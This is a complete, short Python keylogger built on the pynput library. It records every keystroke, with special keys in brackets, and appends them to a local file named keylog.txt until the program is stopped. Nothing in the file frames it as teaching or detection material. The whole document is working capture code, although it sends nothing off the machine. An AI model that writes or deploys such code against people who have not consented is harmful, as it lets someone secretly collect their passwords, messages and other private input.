import pynput.keyboard as keyboard
def key_logger(key):
    try:
        with open("keylog.txt","a") as file:
            file.write(str(key.char))
    except AttributeError:
        #Handle special keys(e.g. Shift, Enter, Space etc.)
        with open("keylog.txt","a") as file:
            file.write(f"[{key}]")

#Create Listener
listener = keyboard.Listener(on_press = key_logger)
listener.start()

#Keep the program running
listener.join()
            
